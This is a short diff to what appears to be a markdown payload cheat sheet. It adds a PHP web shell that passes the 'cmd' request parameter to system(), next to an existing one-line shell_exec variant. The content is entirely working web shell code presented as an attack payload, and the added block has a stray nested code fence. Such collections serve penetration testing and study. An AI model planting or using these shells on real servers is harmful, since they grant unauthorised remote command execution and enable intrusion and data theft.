@@ -269,7 +269,21 @@
   ```
    
   # <kbd>Basic Proportions OK</kbd>
+  
   ```php
+  <?php
+  
+  if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+  }
+
+  ?>
+  ```php
+  
   <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
   ```
   
